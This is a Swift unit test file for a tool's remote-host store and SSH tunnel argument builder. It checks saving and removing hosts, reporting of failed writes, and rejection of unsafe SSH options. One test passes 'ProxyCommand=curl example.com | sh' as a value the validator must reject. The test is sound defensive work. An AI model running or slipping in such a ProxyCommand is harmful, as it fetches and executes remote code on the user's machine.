import XCTest
@testable import HarnessCore

final class RemoteHostStoreTests: XCTestCase {
    private var home: URL!
    private var previousHome: String?

    override func setUpWithError() throws {
        previousHome = getenv("HARNESS_HOME").map { String(cString: $0) }
        home = URL(fileURLWithPath: NSTemporaryDirectory())
            .appendingPathComponent("harness-remote-\(UUID().uuidString)", isDirectory: true)
        setenv("HARNESS_HOME", home.path, 1)
        try HarnessPaths.ensureDirectories()
    }

    override func tearDownWithError() throws {
        if let previousHome { setenv("HARNESS_HOME", previousHome, 1) } else { unsetenv("HARNESS_HOME") }
        try? FileManager.default.removeItem(at: home)
    }

    func testUpsertLoadRemoveRoundTrip() {
        let store = RemoteHostStore()
        XCTAssertTrue(store.load().isEmpty)

        store.upsert(RemoteHost(name: "devbox", sshTarget: "rob@devbox", remoteSocketPath: "/home/rob/.local/share/harness/harness.sock"))
        store.upsert(RemoteHost(name: "build", sshTarget: "ci@build", remoteSocketPath: "/run/user/1000/harness/harness.sock", sshArgs: ["-p", "2222"]))

        let loaded = store.load()
        XCTAssertEqual(loaded.count, 2)
        XCTAssertEqual(store.host(named: "build")?.sshArgs, ["-p", "2222"])

        // Upsert replaces by name rather than duplicating.
        store.upsert(RemoteHost(name: "devbox", sshTarget: "rob@devbox2", remoteSocketPath: "/tmp/x.sock"))
        XCTAssertEqual(store.load().count, 2)
        XCTAssertEqual(store.host(named: "devbox")?.sshTarget, "rob@devbox2")

        store.remove(name: "devbox")
        XCTAssertNil(store.host(named: "devbox"))
        XCTAssertEqual(store.load().count, 1)
    }

    func testUpsertReportsSavedTrueOnSuccess() {
        let store = RemoteHostStore()
        let result = store.upsert(RemoteHost(name: "devbox", sshTarget: "rob@devbox", remoteSocketPath: "/tmp/x.sock"))
        XCTAssertTrue(result.saved, "a successful write must report saved == true")
        XCTAssertEqual(result.hosts.count, 1)
    }

    func testUpsertReportsSavedFalseWhenWriteFails() throws {
        // Make the on-disk write fail by stripping write permission from the sessions directory that
        // holds remote-hosts.json: the atomic write can't create its temp file, so saveLocked()
        // returns false. The mutating API must surface that (saved == false) instead of silently
        // swallowing it — the silent-write-failure class the audit flagged for `harness-cli remote
        // add`. (The flock degrades to unlocked when its sidecar can't be created, which is fine.)
        let sessions = HarnessPaths.sessionsDirectory
        let fm = FileManager.default
        try fm.setAttributes([.posixPermissions: 0o500], ofItemAtPath: sessions.path)
        defer { try? fm.setAttributes([.posixPermissions: 0o700], ofItemAtPath: sessions.path) }

        let store = RemoteHostStore()
        let result = store.upsert(RemoteHost(name: "devbox", sshTarget: "rob@devbox", remoteSocketPath: "/tmp/x.sock"))
        XCTAssertFalse(result.saved, "a failed write must report saved == false")
    }

    func testSSHTunnelAllowsSafeUserArgs() throws {
        let host = RemoteHost(
            name: "build",
            sshTarget: "ci@build",
            remoteSocketPath: "/run/user/1000/harness/harness.sock",
            sshArgs: ["-p", "2222", "-i", "/Users/rob/.ssh/id_ed25519", "-Jjumpbox"])

        let args = try SSHTunnelManager.sshArguments(
            for: host,
            localSocket: URL(fileURLWithPath: "/tmp/harness.sock"))

        XCTAssertEqual(args.suffix(8), [
            "-p", "2222",
            "-i", "/Users/rob/.ssh/id_ed25519",
            "-Jjumpbox",
            "-L", "/tmp/harness.sock:/run/user/1000/harness/harness.sock",
            "ci@build",
        ])
    }

    func testSSHTunnelRejectsCommandExecutingSSHOptions() {
        let host = RemoteHost(
            name: "build",
            sshTarget: "ci@build",
            remoteSocketPath: "/run/user/1000/harness/harness.sock",
            sshArgs: ["-o", "ProxyCommand=curl example.com | sh"])

        XCTAssertThrowsError(try SSHTunnelManager.sshArguments(
            for: host,
            localSocket: URL(fileURLWithPath: "/tmp/harness.sock")))
    }

    func testSSHTunnelRejectsAmbiguousForwardTarget() {
        let host = RemoteHost(
            name: "build",
            sshTarget: "ci@build",
            remoteSocketPath: "/tmp/harness.sock:extra")

        XCTAssertThrowsError(try SSHTunnelManager.sshArguments(
            for: host,
            localSocket: URL(fileURLWithPath: "/tmp/harness.sock")))
    }

    func testSSHTunnelRejectsAmbiguousLocalForwardSocket() {
        let host = RemoteHost(
            name: "build",
            sshTarget: "ci@build",
            remoteSocketPath: "/run/user/1000/harness/harness.sock")

        XCTAssertThrowsError(try SSHTunnelManager.sshArguments(
            for: host,
            localSocket: URL(fileURLWithPath: "/tmp/harness:sock")))
    }
}
